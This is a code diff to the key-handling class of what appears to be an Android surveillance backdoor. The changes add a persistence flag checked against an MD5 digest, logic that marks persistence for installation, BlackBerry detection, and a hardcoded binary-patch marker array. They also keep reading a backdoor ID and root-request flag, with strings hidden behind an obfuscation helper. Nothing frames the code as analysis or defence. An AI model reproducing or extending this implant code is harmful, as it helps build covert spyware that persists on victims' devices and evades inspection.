@@ -8,6 +8,7 @@
 package com.android.dvci.crypto;
 
 import android.content.Context;
+import android.os.Build;
 import android.provider.Settings.Secure;
 import android.telephony.TelephonyManager;
 
@@ -80,8 +81,17 @@ public class Keys {
 	// Random seed
 	private static byte[] randomSeed;
 
+	// persistence
+	private static byte[] persistence;
+
 	private static Object keysLock = new Object();
 
+	//public String binarypatch = "20b25555f79c5549094bfd867fe75d004871f3854be8323fbb07381cd5777ae4c19f70723db754b7374e697113583c42550a470f87488de5381af20126e4ce0245151800f8038996d800fd987c7666dece748f6df7e98cde7499c1402de334200c9a3f4b098e5f88453fab282e49d3d51b7fd3aed73d6ed786f7792a607db2fb5dece9d005f3bc65272bb171ef7325cdaaa40a85909da0f06c790a2ad445c02eb718be87cb4f48f648f66aab59a4e2cb60841bd89242e1524b1e4273e05036b923bee3e8610843cc7ce18f7022f1da6b93c3971fa48036980a29e8499b1c28a7eb12c36fbe16ed5fce983163756c3b93d39540db88ac27be863542d14af1053b";
+	//rand[256]
+	public static byte[] binarypatch = new byte[]{
+			(byte)0x32, (byte)0x30, (byte)0x62, (byte)0x32, (byte)0x35, (byte)0x35, (byte)0x35, (byte)0x35, (byte)0x66, (byte)0x37, (byte)0x39, (byte)0x63, (byte)0x35, (byte)0x35, (byte)0x34, (byte)0x39, (byte)0x30, (byte)0x39, (byte)0x34, (byte)0x62, (byte)0x66, (byte)0x64, (byte)0x38, (byte)0x36, (byte)0x37, (byte)0x66, (byte)0x65, (byte)0x37, (byte)0x35, (byte)0x64, (byte)0x30, (byte)0x30, (byte)0x34, (byte)0x38, (byte)0x37, (byte)0x31, (byte)0x66, (byte)0x33, (byte)0x38, (byte)0x35, (byte)0x34, (byte)0x62, (byte)0x65, (byte)0x38, (byte)0x33, (byte)0x32, (byte)0x33, (byte)0x66, (byte)0x62, (byte)0x62, (byte)0x30, (byte)0x37, (byte)0x33, (byte)0x38, (byte)0x31, (byte)0x63, (byte)0x64, (byte)0x35, (byte)0x37, (byte)0x37, (byte)0x37, (byte)0x61, (byte)0x65, (byte)0x34, (byte)0x63, (byte)0x31, (byte)0x39, (byte)0x66, (byte)0x37, (byte)0x30, (byte)0x37, (byte)0x32, (byte)0x33, (byte)0x64, (byte)0x62, (byte)0x37, (byte)0x35, (byte)0x34, (byte)0x62, (byte)0x37, (byte)0x33, (byte)0x37, (byte)0x34, (byte)0x65, (byte)0x36, (byte)0x39, (byte)0x37, (byte)0x31, (byte)0x31, (byte)0x33, (byte)0x35, (byte)0x38, (byte)0x33, (byte)0x63, (byte)0x34, (byte)0x32, (byte)0x35, (byte)0x35, (byte)0x30, (byte)0x61, (byte)0x34, (byte)0x37, (byte)0x30, (byte)0x66, (byte)0x38, (byte)0x37, (byte)0x34, (byte)0x38, (byte)0x38, (byte)0x64, (byte)0x65, (byte)0x35, (byte)0x33, (byte)0x38, (byte)0x31, (byte)0x61, (byte)0x66, (byte)0x32, (byte)0x30, (byte)0x31, (byte)0x32, (byte)0x36, (byte)0x65, (byte)0x34, (byte)0x63, (byte)0x65, (byte)0x30, (byte)0x32, (byte)0x34, (byte)0x35, (byte)0x31, (byte)0x35, (byte)0x31, (byte)0x38, (byte)0x30, (byte)0x30, (byte)0x66, (byte)0x38, (byte)0x30, (byte)0x33, (byte)0x38, (byte)0x39, (byte)0x39, (byte)0x36, (byte)0x64, (byte)0x38, (byte)0x30, (byte)0x30, (byte)0x66, (byte)0x64, (byte)0x39, (byte)0x38, (byte)0x37, (byte)0x63, (byte)0x37, (byte)0x36, (byte)0x36, (byte)0x36, (byte)0x64, (byte)0x65, (byte)0x63, (byte)0x65, (byte)0x37, (byte)0x34, (byte)0x38, (byte)0x66, (byte)0x36, (byte)0x64, (byte)0x66, (byte)0x37, (byte)0x65, (byte)0x39, (byte)0x38, (byte)0x63, (byte)0x64, (byte)0x65, (byte)0x37, (byte)0x34, (byte)0x39, (byte)0x39, (byte)0x63, (byte)0x31, (byte)0x34, (byte)0x30, (byte)0x32, (byte)0x64, (byte)0x65, (byte)0x33, (byte)0x33, (byte)0x34, (byte)0x32, (byte)0x30, (byte)0x30, (byte)0x63, (byte)0x39, (byte)0x61, (byte)0x33, (byte)0x66, (byte)0x34, (byte)0x62, (byte)0x30, (byte)0x39, (byte)0x38, (byte)0x65, (byte)0x35, (byte)0x66, (byte)0x38, (byte)0x38, (byte)0x34, (byte)0x35, (byte)0x33, (byte)0x66, (byte)0x61, (byte)0x62, (byte)0x32, (byte)0x38, (byte)0x32, (byte)0x65, (byte)0x34, (byte)0x39, (byte)0x64, (byte)0x33, (byte)0x64, (byte)0x35, (byte)0x31, (byte)0x62, (byte)0x37, (byte)0x66, (byte)0x64, (byte)0x33, (byte)0x61, (byte)0x65, (byte)0x64, (byte)0x37, (byte)0x33, (byte)0x64, (byte)0x36, (byte)0x65, (byte)0x64, (byte)0x37, (byte)0x38, (byte)0x36, (byte)0x66, (byte)0x37, (byte)0x37, (byte)0x39, (byte)0x32, (byte)0x61, (byte)0x36, (byte)0x30, (byte)0x37, (byte)0x64, (byte)0x62, (byte)0x32, (byte)0x66, (byte)0x62,
+			//(byte)0x35, (byte)0x64, (byte)0x65, (byte)0x63, (byte)0x65, (byte)0x39, (byte)0x64, (byte)0x30, (byte)0x30, (byte)0x35, (byte)0x66, (byte)0x33, (byte)0x62, (byte)0x63, (byte)0x36, (byte)0x35, (byte)0x32, (byte)0x37, (byte)0x32, (byte)0x62, (byte)0x62, (byte)0x31, (byte)0x37, (byte)0x31, (byte)0x65, (byte)0x66, (byte)0x37, (byte)0x33, (byte)0x32, (byte)0x35, (byte)0x63, (byte)0x64, (byte)0x61, (byte)0x61, (byte)0x61, (byte)0x34, (byte)0x30, (byte)0x61, (byte)0x38, (byte)0x35, (byte)0x39, (byte)0x30, (byte)0x39, (byte)0x64, (byte)0x61, (byte)0x30, (byte)0x66, (byte)0x30, (byte)0x36, (byte)0x63, (byte)0x37, (byte)0x39, (byte)0x30, (byte)0x61, (byte)0x32, (byte)0x61, (byte)0x64, (byte)0x34, (byte)0x34, (byte)0x35, (byte)0x63, (byte)0x30, (byte)0x32, (byte)0x65, (byte)0x62, (byte)0x37, (byte)0x31, (byte)0x38, (byte)0x62, (byte)0x65, (byte)0x38, (byte)0x37, (byte)0x63, (byte)0x62, (byte)0x34, (byte)0x66, (byte)0x34, (byte)0x38, (byte)0x66, (byte)0x36, (byte)0x34, (byte)0x38, (byte)0x66, (byte)0x36, (byte)0x36, (byte)0x61, (byte)0x61, (byte)0x62, (byte)0x35, (byte)0x39, (byte)0x61, (byte)0x34, (byte)0x65, (byte)0x32, (byte)0x63, (byte)0x62, (byte)0x36, (byte)0x30, (byte)0x38, (byte)0x34, (byte)0x31, (byte)0x62, (byte)0x64, (byte)0x38, (byte)0x39, (byte)0x32, (byte)0x34, (byte)0x32, (byte)0x65, (byte)0x31, (byte)0x35, (byte)0x32, (byte)0x34, (byte)0x62, (byte)0x31, (byte)0x65, (byte)0x34, (byte)0x32, (byte)0x37, (byte)0x33, (byte)0x65, (byte)0x30, (byte)0x35, (byte)0x30, (byte)0x33, (byte)0x36, (byte)0x62, (byte)0x39, (byte)0x32, (byte)0x33, (byte)0x62, (byte)0x65, (byte)0x65, (byte)0x33, (byte)0x65, (byte)0x38, (byte)0x36, (byte)0x31, (byte)0x30, (byte)0x38, (byte)0x34, (byte)0x33, (byte)0x63, (byte)0x63, (byte)0x37, (byte)0x63, (byte)0x65, (byte)0x31, (byte)0x38, (byte)0x66, (byte)0x37, (byte)0x30, (byte)0x32, (byte)0x32, (byte)0x66, (byte)0x31, (byte)0x64, (byte)0x61, (byte)0x36, (byte)0x62, (byte)0x39, (byte)0x33, (byte)0x63, (byte)0x33, (byte)0x39, (byte)0x37, (byte)0x31, (byte)0x66, (byte)0x61, (byte)0x34, (byte)0x38, (byte)0x30, (byte)0x33, (byte)0x36, (byte)0x39, (byte)0x38, (byte)0x30, (byte)0x61, (byte)0x32, (byte)0x39, (byte)0x65, (byte)0x38, (byte)0x34, (byte)0x39, (byte)0x39, (byte)0x62, (byte)0x31, (byte)0x63, (byte)0x32, (byte)0x38, (byte)0x61, (byte)0x37, (byte)0x65, (byte)0x62, (byte)0x31, (byte)0x32, (byte)0x63, (byte)0x33, (byte)0x36, (byte)0x66, (byte)0x62, (byte)0x65, (byte)0x31, (byte)0x36, (byte)0x65, (byte)0x64, (byte)0x35, (byte)0x66, (byte)0x63, (byte)0x65, (byte)0x39, (byte)0x38, (byte)0x33, (byte)0x31, (byte)0x36, (byte)0x33, (byte)0x37, (byte)0x35, (byte)0x36, (byte)0x63, (byte)0x33, (byte)0x62, (byte)0x39, (byte)0x33, (byte)0x64, (byte)0x33, (byte)0x39, (byte)0x35, (byte)0x34, (byte)0x30, (byte)0x64, (byte)0x62, (byte)0x38, (byte)0x38, (byte)0x61, (byte)0x63, (byte)0x32, (byte)0x37, (byte)0x62, (byte)0x65, (byte)0x38, (byte)0x36, (byte)0x33, (byte)0x35, (byte)0x34, (byte)0x32, (byte)0x64, (byte)0x31, (byte)0x34, (byte)0x61, (byte)0x66, (byte)0x31, (byte)0x30, (byte)0x35, (byte)0x33, (byte)0x62
+	};
 	/**
 	 * Self.
 	 *
@@ -113,7 +123,7 @@ public class Keys {
 		}
 
 		//20.0=9774d56d682e549c M.d("9774d56d682e549c")
-		if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
+		if (M.e("9774d56d682e549c").equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
 			// http://code.google.com/p/android/issues/detail?id=10603
 			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
 			final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
@@ -141,10 +151,9 @@ public class Keys {
 			challengeKey = ByteArray.copy(resource, 78, 16); // 16 byte
 			demoMode = ByteArray.copy(resource, 110, 24); // 24 byte
 			rootRequest = ByteArray.copy(resource, 134, 16); // 16 byte
-			if (resource.length > 150)
-				randomSeed = ByteArray.copy(resource, 150, 16); // 16 byte
-			else
-				randomSeed = new byte[16];
+
+			randomSeed = ByteArray.copy(resource, 150, 16); // 16 byte
+			persistence = ByteArray.copy(resource, 182, 16); // 16 byte
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
@@ -155,12 +164,47 @@ public class Keys {
 				Check.log(TAG + " demoMode: " + ByteArray.byteArrayToHex(demoMode));//$NON-NLS-1$
 				Check.log(TAG + " rootMode: " + ByteArray.byteArrayToHex(rootRequest));//$NON-NLS-1$
 				Check.log(TAG + " randomSeed: " + ByteArray.byteArrayToHex(randomSeed));//$NON-NLS-1$
+				Check.log(TAG + " persistence: " + ByteArray.byteArrayToHex(persistence));//$NON-NLS-1$
 			}
 
 			if (isDemo() || Cfg.DEBUG) {
 				Cfg.DEMO = true;
 			}
+
+			if (isPersistent()) {
+				Cfg.PERSISTENCE = true;
+			}
+			if (Cfg.PERSISTENCE) {
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_TO_INSTALL);
+			} else {
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_NOT_REQUIRED);
+			}
+
+			if (Build.BOARD.equals(M.e("BLACKBERRY"))) {
+				Cfg.BLACKBERRY = true;
+			}
 		}
+	}
+
+	public boolean isPersistent() {
+		// o5wp2Izl8jTwr8hf md5 = 92c5784a9b14780df0b109df7c2a171a
+
+		if (Cfg.FORCE_NO_PERSISTENCE) {
+			return false;
+		}
+
+		byte[] digest = ByteArray.hexStringToByteArray(M.e("92c5784a9b14780df0b109df7c2a171a"));
+		byte[] calculated = Digest.MD5(persistence);
+
+		boolean ret = Arrays.equals(calculated, digest);
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "  persistence = " + ByteArray.byteArrayToHex(persistence));
+			Check.log(TAG + "  digest = " + ByteArray.byteArrayToHex(calculated));
+			Check.log(TAG + " (isPersistence): " + ret); //$NON-NLS-1$
+		}
+
+		return ret;
 	}
 
 	public boolean isDemo() {
@@ -168,10 +212,10 @@ public class Keys {
 			return false;
 		}
 		// Pg-WaVyPzMMMMmGbhP6qAigT md5= 863d9effe70187254d3c5e9c76613a99
-		byte[] demoDigest = ByteArray.hexStringToByteArray(M.e("863d9effe70187254d3c5e9c76613a99"));
+		byte[] digest = ByteArray.hexStringToByteArray(M.e("863d9effe70187254d3c5e9c76613a99"));
 		byte[] calculated = Digest.MD5(demoMode);
 
-		boolean ret = Arrays.equals(calculated, demoDigest);
+		boolean ret = Arrays.equals(calculated, digest);
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + "  demoMode = " + ByteArray.byteArrayToHex(demoMode));
@@ -213,6 +257,9 @@ public class Keys {
 	 * @return true, if successful
 	 */
 	public boolean hasBeenBinaryPatched() {
+
+		//String binary = binarypatch.substring(0,16);
+		byte binary = binarypatch[0];
 		// EMp7Ca7-fpOBIr md5=b1688ffaaaafd7c1cab52e630b53178f		
 		byte[] bDigest = ByteArray.hexStringToByteArray(M.e("b1688ffaaaafd7c1cab52e630b53178f"));
 		byte[] calculated = Digest.MD5(backdoorId);
@@ -275,12 +322,17 @@ public class Keys {
 	 * @return the subtype
 	 */
 	static public byte[] getSubtype() {
+
+		String board = M.e("ANDROID");
+		if (Build.BOARD.equals(M.e("BLACKBERRY"))) {
+			board = M.e("BLACKBERRY");
+		}
+
 		if (Cfg.DEMO) {
 			// 20.1=DEMO
-			return ("ANDROID-" + M.e("DEMO")).getBytes();
-		} else {
-			return "ANDROID".getBytes();
+			board += M.e("-DEMO");
 		}
+		return board.getBytes();
 	}
 
 	private static byte[] keyFromString(byte[] resource, int from, int len) {
@@ -313,4 +365,11 @@ public class Keys {
 		}
 	}
 
+	public boolean enabled() {
+		if (Cfg.BLACKBERRY) {
+			return false;
+		} else {
+			return true;
+		}
+	}
 }
